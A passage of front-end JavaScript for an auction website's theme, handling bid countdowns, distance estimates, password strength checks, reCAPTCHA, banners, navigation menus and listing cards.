  return html.replace(/&[#a-zA-Z0-9]+;/g, match => {
    return html_entities[match] || match;
  });
};
jQuery.fn.clickOutside = function (callback) {
  var outside = 1,
    self = jQuery(this);
  self.cb = callback;
  this.click(function () {
    outside = 0;
  });
  jQuery(document).click(function () {
    outside && self.cb();
    outside = 1;
  });
  return jQuery(this);
};
BaT_Theme.formatCountdown = function (timestampDiff) {
  if (0 === timestampDiff) {
    return BaT_Theme.textEnded;
  }
  var days = Math.floor(timestampDiff / 86400);
  var hours = Math.floor((timestampDiff - days * 86400) / 3600);
  var minutes = Math.floor((timestampDiff - days * 86400 - hours * 3600) / 60);
  var seconds = Math.floor(timestampDiff - days * 86400 - hours * 3600 - minutes * 60);
  if (0 < days) {
    let dateCurrent = new Date();
    let dateEnd = new Date(dateCurrent.getTime() + timestampDiff * 1000);
    dateCurrent.setHours(0, 0, 0, 0);
    dateEnd.setHours(0, 0, 0, 0);
    let daysDiff = Math.floor((dateEnd.getTime() - dateCurrent.getTime()) / 86400000);
    return daysDiff.toString() + ' ' + (1 < daysDiff ? BaT_Theme.textDaysPlural : BaT_Theme.textDaysSingular);
  } else if (0 === hours && 0 === minutes) {
    return seconds.toString() + 's';
  } else {
    let countdownText = '';
    countdownText += hours > 0 ? hours.toString() + ':' : '';
    countdownText += hours > 0 && minutes < 10 ? '0' : '';
    countdownText += minutes > 0 ? minutes.toString() + ':' : '0:';
    countdownText += seconds < 10 ? '0' : '';
    countdownText += seconds > 0 ? seconds.toString() : '0';
    return countdownText;
  }
};

// Distance is calculated using: Haversine formula
BaT_Theme.distanceBetweenCoordinates = function (lat1, lon1, lat2, lon2, unit) {
  unit = typeof unit === 'undefined' ? 'miles' : unit;
  var deg2rad = function (deg) {
    return deg * (Math.PI / 180);
  };
  var R = 6371; // Radius of the earth in km
  var dLat = deg2rad(lat2 - lat1);
  var dLon = deg2rad(lon2 - lon1);
  var a = Math.sin(dLat / 2) * Math.sin(dLat / 2) + Math.cos(deg2rad(lat1)) * Math.cos(deg2rad(lat2)) * Math.sin(dLon / 2) * Math.sin(dLon / 2);
  var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  var distanceInKm = R * c;
  if (unit === 'miles') {
    return distanceInKm * 0.621371;
  } else {
    return distanceInKm;
  }
};
BaT_Theme.formatDistanceInMiles = function (distance) {
  var approximateDrivingDistance = distance * 1.2;
  if (approximateDrivingDistance < 10) {
    var distanceRounded = '< 10 ';
  } else if (approximateDrivingDistance < 1000) {
    // Round values up to the nearest 10, e.g. 76 becomes 80
    var distanceRounded = Math.ceil(approximateDrivingDistance / 10) * 10;
  } else {
    // Round values up to the nearest 100, e.g. 1015 becomes 1100
    var distanceRounded = Math.ceil(approximateDrivingDistance / 100) * 100;
  }
  return distanceRounded + ' ' + BaT_Theme.closestToZipMilesText;
};
BaT_Theme.getTickableFunction = function ($element, callback) {
  var $element = jQuery($element),
    $placeh = jQuery('<span></span>').hide();
  $placeh.insertAfter($element);
  return function (parts) {
    var secondsRemaining = jQuery.countdown.periodsToSeconds(parts);
    if (callback && callback.call) {
      callback.call(this, parts);
    }
    if ($element.data('processed_final')) {
      return;
    }

    // Less than 2 minutes
    if (secondsRemaining <= 120) {
      $element.addClass('blinker').data('processed_final', true);
      $placeh.hide();
    }
    if ($element.data('processed_second')) {
      return;
    }

    // Less than 1 hour
    if (secondsRemaining < 3600) {
      $element.data('processed_second', true).data('processed', true);
      $placeh.hide();
      setTimeout(function () {
        $element.countdown('option', 'compact', true).countdown('option', 'layout', '{mn}:{snn}').addClass('text-primary');
      }, 10);
    }
    if ($element.data('processed')) {
      return;
    }

    // Less than 24 hours
    if (secondsRemaining < 24 * 60 * 60) {
      $element.data('processed', true);
      $placeh.hide();
      setTimeout(function () {
        $placeh.hide();
        $element.show().countdown('option', {
          compact: true,
          layout: '{h<}{hn}:{h>}{mnn}:{snn}'
        }).addClass('text-primary');
      }, 10);
    } else {
      $element.hide();
      $placeh.show();

      // More than 24 hours
      var dateFinal = new Date($element.countdown('option', 'until').getTime()),
        dateCurrent = new Date(),
        days = 0;
      while (dateCurrent < dateFinal) {
        days++;
        dateCurrent.setDate(dateCurrent.getDate() + 1);
        dateCurrent.setHours(dateFinal.getHours());
        dateCurrent.setMinutes(dateFinal.getMinutes());
        dateCurrent.setSeconds(dateFinal.getSeconds());
        dateCurrent.setMilliseconds(dateFinal.getMilliseconds());
      }
      if (1 === days) {
        $placeh.text(days + ' day');
      } else {
        $placeh.text(days + ' days');
      }
    }
  };
};
BaT_Theme.addBid = function (bidData) {
  var $list = jQuery('.recent-bids-list'),
    $links = jQuery('.recent-bids-image-links'),
    $item = jQuery(bidData.markup_bid),
    $link = jQuery(bidData.markup_bid_image),
    $curr = $list.find('[data-listing="' + $item.data('listing') + '"]'),
    $currl = $links.find('[data-listing="' + $item.data('listing') + '"]'),
    image = new Image();
  var afterPreload = function () {
    var callback = function () {
      $item.find('.recent-bids-list-item-datum-inner:not(.recent-bids-list-item-datum-inner-placeholder)').slideDown(400);
      setTimeout(function () {
        $links.animate({
          opacity: 0
        }, 200, function () {
          $currl.remove();
          $links.prepend($link);
          $links.animate({
            opacity: 1
          }, 200);
          BaT_Theme.recentBidsCountdowns();
        });
      }, 450);
    };
    $item.find('.recent-bids-list-item-datum-inner:not(.recent-bids-list-item-datum-inner-placeholder)').css('display', 'block').hide().end().prependTo($list);
    jQuery('.recent-bids-image-link:nth-child(2)').css('margin-right', 0);
    jQuery('.recent-bids-image-link:nth-child(3)').hide();
    if ($curr.size() > 0) {
      $curr.find('.recent-bids-list-item-datum-inner:visible').fadeOut(400);
      setTimeout(function () {
        $curr.find('.recent-bids-list-item-datum-remaining .recent-bids-list-item-datum-inner').countdown('destroy').end().remove();
        callback();
      }, 450);
    } else {
      // Account for when there isn't a previous bid
      callback();
    }
  };
  image.onload = afterPreload;
  image.src = $link.find('img').attr('src');
};
BaT_Theme.recentBidsCountdowns = function () {
  jQuery('.recent-bids-list-item .recent-bids-list-item-datum-remaining .recent-bids-list-item-datum-inner[data-recent_bid_auction_ends]').filter(function (index, element) {
    return true !== jQuery(element).data('recent_bid_countdown_initialized');
  }).each(function (index, element) {
    var $element = jQuery(element),
      $placeh = $element.siblings('.recent-bids-list-item-datum-inner-placeholder'),
      until = new Date($element.data('recent_bid_auction_ends') * 1000),
      options = {};
    options = {
      alwaysExpire: true,
      expiryText: 'Ended',
      format: 'ymwdhMS',
      labels: ['years', 'months', 'weeks', 'days', 'hours', 'minutes', 'seconds'],
      labels1: ['year', 'month', 'week', 'day', 'hour', 'minute', 'second'],
      layout: ' ',
      until: until,
      onExpiry: function () {
        var $done = $element.parents('.recent-bids').find('[data-listing="' + $element.parents('.recent-bids-list-item').data('listing') + '"]');
        setTimeout(function () {
          $done.fadeOut(400, function () {
            $element.countdown('destroy');
            $done.remove();
          });
        }, 1);
      },
      onTick: function (parts) {
        var secondsRemaining = jQuery.countdown.periodsToSeconds(parts);
        if ($element.data('processed_final')) {
          return;
        }

        // Less than 2 minutes
        if (secondsRemaining <= 120) {
          $element.addClass('blinker').data('processed_final', true);
        }
        if ($element.data('processed_second')) {
          return;
        }

        // Less than 1 hour
        if (secondsRemaining <= 3600) {
          $element.data('processed_second', true).data('processed', true);
          setTimeout(function () {
            $element.countdown('option', 'compact', true).countdown('option', 'layout', '{mn}:{snn}').addClass('recent-bids-list-item-datum-inner-final');
          }, 100);
        }
        if ($element.data('processed')) {
          return;
        }

        // Less than 24 hours
        if (secondsRemaining < 24 * 60 * 60) {
          $element.data('processed', true);
          setTimeout(function () {
            $element.show().countdown('option', {
              compact: true,
              layout: '{h<}{hn}:{h>}{mnn}:{snn}'
            }).addClass('recent-bids-list-item-datum-inner-final');
            $placeh.hide();
          }, 100);
        } else {
          $element.hide();
          $placeh.show();

          // More than 24 hours
          var dateFinal = new Date($element.countdown('option', 'until').getTime()),
            dateCurrent = new Date(),
            days = 0;
          while (dateCurrent < dateFinal) {
            days++;
            dateCurrent.setDate(dateCurrent.getDate() + 1);
            dateCurrent.setHours(dateFinal.getHours());
            dateCurrent.setMinutes(dateFinal.getMinutes());
            dateCurrent.setSeconds(dateFinal.getSeconds());
            dateCurrent.setMilliseconds(dateFinal.getMilliseconds());
          }
          if (1 === days) {
            $placeh.text(days + ' day');
          } else {
            $placeh.text(days + ' days');
          }
        }
      }
    };
    $element.countdown(options);
    $element.data('recent_bid_countdown_initialized', true);
  });
};
BaT_Theme.featuredListingsCountdown = function () {
  jQuery('.featured-listing-meta-value[data-featured_listing][data-featured_listing_ends]').each(function (index, element) {
    var $element = jQuery(element),
      $placeh = $element.siblings('[data-featured_placeholder]'),
      until = new Date($element.data('featured_listing_ends') * 1000),
      options = {};
    options = {
      alwaysExpire: true,
      expiryText: 'Ended',
      format: 'ymwdhMS',
      labels: ['years', 'months', 'weeks', 'days', 'hours', 'minutes', 'seconds'],
      labels1: ['year', 'month', 'week', 'day', 'hour', 'minute', 'second'],
      layout: '{dn} {dl}',
      until: until,
      onExpiry: function () {},
      onTick: function (parts) {
        var secondsRemaining = jQuery.countdown.periodsToSeconds(parts);
        if ($element.data('processed_final')) {
          return;
        }

        // Less than 2 minutes
        if (secondsRemaining <= 120) {
          $element.addClass('blinker').data('processed_final', true);
        }
        if ($element.data('processed_second')) {
          return;
        }

        // Less than 1 hour
        if (secondsRemaining <= 3600) {
          $element.data('processed_second', true).data('processed', true);
          setTimeout(function () {
            $element.countdown('option', 'compact', true).countdown('option', 'layout', '{mn}:{snn}').addClass('recent-bids-list-item-datum-inner-final');
          }, 100);
        }
        if ($element.data('processed')) {
          return;
        }

        // Less than 24 hours
        if (secondsRemaining < 24 * 60 * 60) {
          $element.data('processed', true);
          setTimeout(function () {
            $element.show().countdown('option', {
              compact: true,
              layout: '{h<}{hn}:{h>}{mnn}:{snn}'
            }).addClass('recent-bids-list-item-datum-inner-final');
            $placeh.hide();
          }, 100);
        } else {
          $element.hide();
          $placeh.show();

          // More than 24 hours
          var dateFinal = new Date($element.countdown('option', 'until').getTime()),
            dateCurrent = new Date(),
            days = 0,
            dayInMilliseconds = 24 * 60 * 60 * 1000;
          dateFinal.setHours(0);
          dateFinal.setMinutes(0);
          dateFinal.setSeconds(0);
          dateFinal.setMilliseconds(0);
          dateCurrent.setHours(0);
          dateCurrent.setMinutes(0);
          dateCurrent.setSeconds(0);
          dateCurrent.setMilliseconds(0);
          while (dateCurrent.getTime() < dateFinal.getTime()) {
            days++;
            dateCurrent.setTime(dateCurrent.getTime() + dayInMilliseconds);
          }
          if (1 === days) {
            $placeh.text(days + ' day');
          } else {
            $placeh.text(days + ' days');
          }
        }
      }
    };
    $element.countdown(options);
  });
};
BaT_Theme.newRelicSendEvent = function (eventName, eventPayload) {
  const newRelicEndpoint = `https://${window.location.hostname}/wp-json/bringatrailer/1.0/webhooks/new-relic`;
  let nrEventName = '';
  let nrEventPayload = [];
  let eventParamsQuery = '';

  // if we don't have these set then that means we're just
  // running this function to test it.
  if (!eventName && !eventPayload) {
    nrEventName = 'user_listing_comment_failure';
    nrEventPayload = {
      status_code: 400,
      error_message: 'Test error message'
    };
  } else {
    nrEventName = eventName;
    nrEventPayload = eventPayload;
  }

  // build the http query to send the params data
  for (let key in nrEventPayload) {
    eventParamsQuery += `event_params[${key}]=${nrEventPayload[key]}&`;
  }
  var settings = {
    "headers": {
      'X-WP-Nonce': BaT_Theme.ajaxCommentFailureNewRelicEventNonce
    },
    "url": `${newRelicEndpoint}?event_name=${nrEventName}&${eventParamsQuery}`,
    "method": "POST",
    "timeout": 0
  };
  jQuery.ajax(settings).done(function (response) {
    // perform an action here when the ajax response is done.
  }).fail(response => {});
};

/**
 * Request a new reCaptcha token and stores the value in the specified input
 * The token expires after 2 minutes, so only call this when you are ready to submit the form
 *
 * @param {Object} callback function to execute once the reCaptcha token is retrieved
 * @param {jQuery|bool} $input jQuery selector for the input to store the reCaptcha token in
 * @returns {Object} The callback
 */
BaT_Theme.getRecaptchaToken = function (callback, $input = false) {
  if (false !== $input && !$input.length) {
    return callback();
  }
  window.grecaptcha.ready(function () {
    window.grecaptcha.execute(BaT_Recaptcha.siteKey, {
      action: BaT_Recaptcha.actionRegister
    }).then(function (token) {
      if (false !== $input) {
        $input.val(token);
      }
      return callback();
    });
  });
};
if ('no' === BaT_Theme.loggedIn) {
  /**
   * The following basically detects if the user is returning after more than
   * an hour away from the site or if they are fresh to the site. If either of
   * those cases are two, then increment the visit counter. If the visit counter
   * is equal to 2 then run some functionality.
   */
  (function () {
    var trackerAlt = BaT_Theme.getCookie('bat_tracking_data_alt'),
      trackerMain = BaT_Theme.getCookie('bat_tracking_data');
    if (null === trackerAlt && null === trackerMain && 'object' === typeof JSON && 'function' === typeof JSON.stringify) {
      BaT_Theme.setCookie('bat_tracking_data_alt', JSON.stringify({
        conversion: 0,
        datetime: Math.ceil(new Date().getTime() / 1000),
        redirect: document.location.href,
        referrer: document.referrer
      }), 24 * 365 * 3);
    }
  })();
}

// Handle the dismissable popup by looking at a cookie and also handling button clicks
const trackedKeys = window.keysToWatch;
(function () {
  var dismissedTermsNotice = 1 === parseInt(BaT_Theme.getCookie('dismissedTermsNotice')),
    termsBanner = document.querySelector('#banner-terms'),
    termsDismiss = document.querySelector('#banner-terms-dismiss');
  if (null === termsBanner || null === termsDismiss) {
    return;
  }
  if (dismissedTermsNotice) {
    termsBanner.remove();
  }
  termsDismiss.addEventListener('click', function (event) {
    BaT_Theme.setCookie('dismissedTermsNotice', 1, 720);
    termsBanner.remove();
  });
})();
jQuery(document).ready(function ($) {
  var _ = window.lodash;

  // Forgot password form submission
  $('.bat-listings-users-form-login-fp').on('submit', function (e) {
    var $form = $(this);
    var $input = $form.find('input[name="bat-listings-users[g-recaptcha-response]"]');
    if (!$input.val()) {
      e.preventDefault();
      BaT_Theme.getRecaptchaToken(() => $form.submit(), $input);
    }
  });

  // Secure password banner cookie handling
  (function () {
    var updatePasswordBanner = document.getElementById('banner-password-update');
    var passwordUpdateDismiss = document.getElementById('banner-password-update-dismiss');
    if (null === updatePasswordBanner || null === passwordUpdateDismiss) {
      return;
    }
    var dismissedPasswordUpdate = parseInt(BaT_Theme.getCookie('dismissedPasswordUpdate'));
    var current_user_id = parseInt(passwordUpdateDismiss.getAttribute("value"));
    if (current_user_id === dismissedPasswordUpdate) {
      updatePasswordBanner.remove();
    } else {
      updatePasswordBanner.style.display = 'block';
    }
    passwordUpdateDismiss.addEventListener('click', function () {
      BaT_Theme.setCookie('dismissedPasswordUpdate', current_user_id, 0);
      updatePasswordBanner.remove();
    });
  })();

  // Password Strength Meter
  (function () {
    $('.bat-password-strength-meter').each(function (key, item) {
      var $password = $("#bat-listings-users-password, .bat-submission-users-password input");
      var $confirmPassword = $("#bat-listings-users-confirm-password, .bat-submission-users-confirm-password input");
      var $submitButton = $password.closest('form').find("input[type=submit]");
      var isProfileEditForm = $submitButton.closest(".bat-listings-users-form-profile-edit").length > 0;
      // Gravity form
      var isGravityForm = $(".gform_bat_submission_wrapper").length > 0;
      var passwordStrength = 0;
      var appendConfirmationErrorMessage = function () {
        var passwordStrengthErrorMessage = `<label for="bat-listings-users-confirm-password" class="control-group-error">${BaT_Password_Strength_Meter.passwordStrengthConfirmationError}</label>`;
        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
        $confirmPassword.closest('.control-group').append(passwordStrengthErrorMessage);
      };
      var checkPasswordsMatch = function (password, confirmation) {
        $submitButton.prop("disabled", (password !== confirmation || passwordStrength < BaT_Password_Strength_Meter.passwordStrengthThreshold) && !isProfileEditForm && !isGravityForm);
        $confirmPassword.closest('.control-group').find('.control-group-error').remove();
        if (!password.startsWith(confirmation)) {
          appendConfirmationErrorMessage();
        }
      };
      $submitButton.prop("disabled", !isProfileEditForm && !isGravityForm);

      // Verify is strength meter is displayed on gravity forms
      var gFieldPassMeter = $('.gfield_passwd_strenght_meter');
      gFieldPassMeter.css("display", "none");
      $password.on('input', function () {
        $password.val($password.val().trim());

        // If password has not any values, remove extra space
        if ($password.val().length > 0) {
          gFieldPassMeter.css("display", "block");
        } else {
          gFieldPassMeter.css("display", "none");
        }
        var password = $password.val();
        if (password === "") {
          $(item).css("display", "none");
          $submitButton.prop("disabled", !isProfileEditForm);
          return;
        }
        var $bar = $('.bat-password-strength-meter-bar');
        var $passwordStrengthText = $('.bat-password-strength-text');
        var $suggestionsList = $('.bat-password-strength-suggestions');
        var strengthText = "";
        passwordStrength = zxcvbn(password).score;
        switch (passwordStrength) {
          case 0:
          case 1:
          case 2:
            strengthText = BaT_Password_Strength_Meter.passwordStrengthLow;
            break;
          case 3:
            strengthText = BaT_Password_Strength_Meter.passwordStrengthMedium;
            break;
          case 4:
            strengthText = BaT_Password_Strength_Meter.passwordStrengthHigh;
            break;
          default:
          //
        }
        $bar.removeClass('level-0 level-1 level-2 level-3 level-4').addClass(`level-${passwordStrength}`);
        $passwordStrengthText.text(strengthText);
        $suggestionsList.toggle(passwordStrength < BaT_Password_Strength_Meter.passwordStrengthThreshold);
        $(item).css("display", "flex");
        checkPasswordsMatch($password.val(), $confirmPassword.val());
      });
      $confirmPassword.on('blur', function () {
        $confirmPassword.val($confirmPassword.val().trim());
        $confirmPassword.closest('.control-group').find('.control-group-error').remove();
        if ($password.val() !== $confirmPassword.val()) {
          appendConfirmationErrorMessage();
        }
      });
      $confirmPassword.on('input', function () {
        $confirmPassword.val($confirmPassword.val().trim());
        checkPasswordsMatch($password.val(), $confirmPassword.val());
      });
    });
  })();

  // Header main and secondary menues. On wide touchscreen devices, show submenu instead of navigating to the clicked top menu item if user clicks it once.
  (function () {
    if (window.matchMedia("(pointer: coarse)").matches) {
      document.querySelectorAll('#site-header-menu-main li.menu-item-has-children > a, #site-header-menu-secondary li.menu-item-has-children > a').forEach(function (node) {
        node.addEventListener('touchstart', function (event) {
          if (null === event.target.closest('li').querySelector('a:hover')) {
            event.target.classList.add('prevent-default');
          }
        });
        node.addEventListener('click', function (event) {
          if (event.target.classList.contains('prevent-default')) {
            event.preventDefault();
            event.target.classList.remove('prevent-default');
          }
        });
      });
    }
  })();
  (function () {
    if ('ontouchstart' in window || navigator.maxTouchPoints) {
      document.querySelector('body').classList.add('touch-device');
    } else {
      document.querySelector('body').classList.remove('touch-device');
    }
  })();

  // Header priority menu
  (function () {
    BaT_Theme.headerPriorityMenu = function () {
      var self = this;
      self.target = document.querySelector('#site-header-menu-secondary');
      if (null === self.target) {
        return;
      }
      self.outerContainer = self.target.parentNode;
      self.listItems = document.querySelectorAll('#site-header-menu-secondary > li');
      self.listItems = Array.prototype.slice.call(self.listItems);
      self.toggle = document.createElement('li');
      // phpcs:ignore WordPressVIPMinimum.JS.InnerHTML.Found,WordPressVIPMinimum.JS.StringConcat.Found -- HTML is valid.
      self.toggle.innerHTML = '<span>' + BaT_Theme.textMore + '</span>';
      self.toggle.classList.add('overflow-items-toggle');
      self.toggle.classList.add('menu-item');
      self.toggle.classList.add('menu-item-has-children');
      self.target.classList.add('has-oveflow-items');
      self.target.appendChild(self.toggle);
      self.overflow = document.createElement('ul');
      self.overflow.classList.add('sub-menu');
      self.toggle.appendChild(self.overflow);
      self.overflowItems = [];
      self.getWidthDifference = function () {
        return self.getInnerWidth(self.outerContainer) - Array.prototype.reduce.call(self.listItems, function (initialValue, element) {
          return initialValue + self.getOuterWidth(element);
        }, 0);
      };
      self.getInnerWidth = function (element) {
        var computedStyle = getComputedStyle(element);
        return element.getBoundingClientRect().width - parseFloat(computedStyle.paddingLeft) - parseFloat(computedStyle.paddingRight);
      };
      self.getOuterWidth = function (element) {
        var computedStyle = getComputedStyle(element);
        return element.getBoundingClientRect().width + parseFloat(computedStyle.marginLeft) + parseFloat(computedStyle.marginRight);
      };
      var animationFrameId;
      window.addEventListener('resize', function () {
        if (!animationFrameId) {
          animationFrameId = requestAnimationFrame(function () {
            animationFrameId = null;
            self.onResize();
          });
        }
      });
      self.onResize = function () {
        if (!(self.target.offsetWidth || self.target.offsetHeight || self.target.getClientRects().length)) {
          return;
        }
        var widthDifference = self.getWidthDifference();
        if (self.overflowItems.length) {
          widthDifference -= self.getOuterWidth(self.toggle);
        }
        if (widthDifference < 0) {
          while (self.listItems.length && widthDifference < 0) {
            var listItem = self.listItems.pop();
            self.overflowItems.unshift({
              node: listItem,
              width: self.getOuterWidth(listItem)
            });

            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.prepend -- Element already exists in the DOM and does not need escaping.
            self.overflow.prepend(listItem);
            widthDifference = self.getWidthDifference();
            if (self.listItems.length) widthDifference -= self.getOuterWidth(self.toggle);
          }
        } else {
          if (self.overflowItems.length === 1) {
            widthDifference += self.getOuterWidth(self.toggle);
          }
          while (self.overflowItems.length && widthDifference > self.overflowItems[0].width) {
            var lastItem = self.overflowItems.shift();

            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.insertBefore -- Element already exists in the DOM and does not need escaping.
            self.target.insertBefore(lastItem.node, self.toggle);
            self.listItems.push(lastItem.node);
            widthDifference -= lastItem.width;
          }
        }
        if (self.overflowItems.length) {
          self.target.classList.add('has-oveflow-items');
        } else {
          self.target.classList.remove('has-oveflow-items');
        }
      };
      self.onResize();
    };
    BaT_Theme.headerPriorityMenu();
  })();

  // Header mobile menu
  (function () {
    BaT_Theme.headerMobileMenu = function () {
      var self = this;
      self.mobile_menu = document.querySelector('#site-header-menu-mobile');
      self.mobile_menu_toggle_btn = document.querySelector('#site-header-menu-mobile-toggle');
      if (null === self.mobile_menu || null === self.mobile_menu_toggle_btn) {
        return;
      }
      self.recalculate = function () {
        var sh = 0;
        if (self.mobile_menu.classList.contains('mobile-menu-open')) {
          sh = self.mobile_menu.scrollHeight;
        }
        document.querySelector('#site-header-menu-mobile-wrap').style.height = sh + 'px';
      };
      self.hideMenu = function () {
        self.mobile_menu.classList.remove('mobile-menu-open');
        document.querySelector('body').classList.remove('cover');
        if (document.querySelector('#site-header-menu-mobile .sub-menu-open')) {
          document.querySelector('#site-header-menu-mobile .sub-menu-open').classList.remove('sub-menu-open');
          self.mobile_menu.classList.remove('sub-menu-open');
        }
        self.recalculate();
      };
      self.showMenu = function () {
        self.mobile_menu.classList.add('mobile-menu-open');
        document.querySelector('body').classList.add('cover');
        self.recalculate();
      };
      self.mobile_menu_toggle_btn.addEventListener('click', function (event) {
        event.preventDefault();
        if (self.mobile_menu.classList.contains('mobile-menu-open')) {
          self.hideMenu();
        } else {
          self.showMenu();
        }
      });
      document.querySelector('body').addEventListener('click', function (event) {
        if ((event.target.classList.contains('cover') || event.target.classList.contains('search-bar-input')) && self.mobile_menu.classList.contains('mobile-menu-open')) {
          //todo:2710 review this condition
          self.hideMenu();
        }
      });
      self.mobile_menu.querySelectorAll('.sub-menu').forEach(function (node) {
        var back_btn = document.createElement('li');
        // phpcs:ignore WordPressVIPMinimum.JS.InnerHTML.Found,WordPressVIPMinimum.JS.StringConcat.Found -- HTML is valid.
        back_btn.innerHTML = '<span>' + BaT_Theme.textBack + '</span>';
        back_btn.classList.add('sub-menu-back-btn');
        back_btn.addEventListener('click', function (event) {
          self.mobile_menu.classList.remove('sub-menu-open');
          event.target.closest('ul').classList.remove('sub-menu-open');
          self.recalculate();
        });

        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.prepend -- HTML is valid.
        node.prepend(back_btn);
      });
      self.mobile_menu.querySelectorAll('.menu-item-has-children > a').forEach(function (node) {
        node.addEventListener('click', function (event) {
          event.preventDefault();
          if (event.target.parentNode.querySelector('.sub-menu').classList.contains('sub-menu-open')) {
            event.target.parentNode.querySelector('.sub-menu').classList.remove('sub-menu-open');
            self.recalculate();
            return;
          }
          if (document.querySelector('#site-header-menu-mobile .sub-menu-open')) {
            document.querySelector('#site-header-menu-mobile .sub-menu-open').classList.remove('sub-menu-open');
          }
          self.mobile_menu.classList.add('sub-menu-open');
          event.target.parentNode.querySelector('.sub-menu').classList.add('sub-menu-open');
          self.recalculate();
        });
      });
      window.addEventListener('resize', function () {
        if (self.mobile_menu.classList.contains('mobile-menu-open') && this.innerWidth > 750) {
          self.hideMenu();
        }
      });
    };
    BaT_Theme.headerMobileMenu();
  })();

  // Listings Cards (A standalone cards with a html generated on the server that work without knockout.js)
  (function () {
    var $listing_cards = $('.listing-card-separate');
    $listing_cards.each(function (index, element) {
      var $card = $(element);
      $card.find('.icon-item-watch').on('click', function (event) {
        if ('no' === BaT_Theme.loggedIn) {
          document.location.href = $card.data('watch_url');
          return;
        }
        var $thisIcon = $(this);
        var handle = $thisIcon.data('handle');
        handle = 'undefined' === typeof handle ? null : handle;
        clearTimeout(handle);
        $thisIcon.data('handle', null);
        var watched = $card.data('watched');
        $card.data('watched', !watched);
        $thisIcon.toggleClass('item-watched', !watched);
        handle = setTimeout(function () {
          jQuery.post($card.data('watch_url'), {
            ajax: true,
            watch: watched ? 'no' : 'yes'
          });
        }, 750);
        $thisIcon.data('handle', handle);
      });
    });
    BaT_Theme.listingCardOnMetadataUpdated = function (data) {
      $listing_cards.each(function (index, element) {
        var $card = $(element);
        if (data.post_id === $card.data('listing_id') && 'undefined' !== typeof data.listing_card_data) {
          $card.find('.bid-label').text(data.listing_card_data.current_bid_label);
          $card.find('.bid-formatted').text(data.listing_card_data.current_bid_formatted);
          $card.data('timestamp_end', data.listing_card_data.timestamp_end);
        }
      });
    };
    BaT_Theme.listingCardOnCommentsUpdated = function (data) {
      $listing_cards.each(function (index, element) {
        var $card = $(element);
        if (data.content === $card.data('listing_id')) {
          $card.find('.item-comments').text(data.formatted);
        }
      });
    };
    BaT_Theme.listingCardOnStatsUpdated = function (data) {
      $listing_cards.each(function (index, element) {
        var $card = $(element);
        if (data.post_id === $card.data('listing_id')) {
          $card.find('.item-views').text(data.views);
          $card.find('.item-watchers').text(data.watchers);
        }
      });
    };
    var updateListingCardsView = function () {
      $listing_cards.each(function (index, element) {
        var $card = $(element);
        var secondsToEnd = Math.max(0, $card.data('timestamp_end') - Math.floor(new Date().getTime() / 1000));
        $card.find('.countdown-text').text(BaT_Theme.formatCountdown(secondsToEnd));
        $card.find('.countdown-text').toggleClass('final-countdown', 86400 > secondsToEnd);
        $card.find('.icon-item-watch').toggleClass('item-watched', true === $card.data('watched'));
        $card.find('progress').val(secondsToEnd);
        $card.find('progress').toggleClass('progress-counting', 121 > secondsToEnd && 0 < secondsToEnd);
        $card.find('progress').toggleClass('progress-final-min', 61 > secondsToEnd);
      });
    };
    setInterval(function () {
      updateListingCardsView();
    }, 1000);
    updateListingCardsView();
  })();

  // Latest features widget
  (function () {
    var featurePaged = 0,
      innerWidth,
      scrollOffsets = [],
      windowWidth;
    $(window).on('load resize', function (event) {
      var featureItems = 0,
        windowWidth = $(window).width(),
        $latestFeatures = $('.home .loop .bat-latest-features'),
        $arrowWrap = $('.home .loop .latest-features .controls');
      if (windowWidth < 751) {
        // Clone features width into the home loop and assign variables
        if (0 == $latestFeatures.length) {
          $latest_features_widget = $('.home .sidebar .latest-features');
          if ($latest_features_widget.length > 0) {
            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.after -- HTML is properly escaped.
            $('.home .loop > .post:nth-child(3)').after($latest_features_widget.clone().addClass('bat-horizontal-gallery'));
            $('.home .loop .bat-latest-features > .feature:nth-child(n+7)').remove();
            $('.home .loop .more-features').remove();
            $latestFeatures = $('.home .loop .bat-latest-features');

            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.prepend -- HTML is properly escaped.
            $('.home .loop .latest-features').prepend(BaT_Theme.featuredArrowWrap);
            $arrowWrap = $('.home .loop .latest-features .controls');

            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.html -- HTML is properly escaped.
            $arrowWrap.html(BaT_Theme.featuredArrowLeft);
            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
            $arrowWrap.append(BaT_Theme.featuredArrowRight);
            var $arrowLeft = $arrowWrap.find('.left'),
              $arrowRight = $arrowWrap.find('.right'),
              featureItems = $('.home .loop .bat-latest-features .feature').length;
            $latestFeatures.scroll(function () {
              featureSetArrows();
            });
            $arrowLeft.click(function (event) {
              event.preventDefault();
              mobileFeaturesScrolling('prev');
            });
            $arrowRight.click(function (event) {
              event.preventDefault();
              mobileFeaturesScrolling('next');
            });
          }
        }

        // Measure features for scrolling
        if (featureItems > 0) {
          scrollOffsets = [], innerWidth = $latestFeatures.length > 0 ? $latestFeatures[0].scrollWidth : 0;
          if (innerWidth > windowWidth) {
            var containerOffset = $('.home .loop .bat-latest-features .feature').offset().left;
            $('.home .loop .bat-latest-features .feature').each(function (index, featureItem) {
              var $featureItem = $(featureItem),
                featureItemAbsoluteOffset = $featureItem.offset().left,
                featureItemScrollOffset = Math.floor(featureItemAbsoluteOffset - containerOffset);
              if (0 != featureItemScrollOffset) {
                featureItemScrollOffset -= 52;
              }
              scrollOffsets.push(featureItemScrollOffset);
            });
            $arrowWrap.show();
            featureSetArrows();
          } else {
            $arrowWrap.hide();
          }
        }
      }
    });
    function mobileFeaturesScrolling(direction) {
      var $latestFeatures = $('.home .loop .bat-latest-features'),
        featureIndex,
        nextIndex = 0;
      for (var i = 0; i < scrollOffsets.length; i++) {
        if ($latestFeatures.scrollLeft() >= scrollOffsets[i]) {
          featureIndex = i;
        }
      }
      if (direction === 'prev') {
        nextIndex = featureIndex - 1;
      } else if (direction === 'next') {
        nextIndex = featureIndex + 1;
      }
      if (nextIndex < 1) {
        $latestFeatures.animate({
          scrollLeft: 0
        }, 200);
      } else {
        $latestFeatures.animate({
          scrollLeft: scrollOffsets[nextIndex]
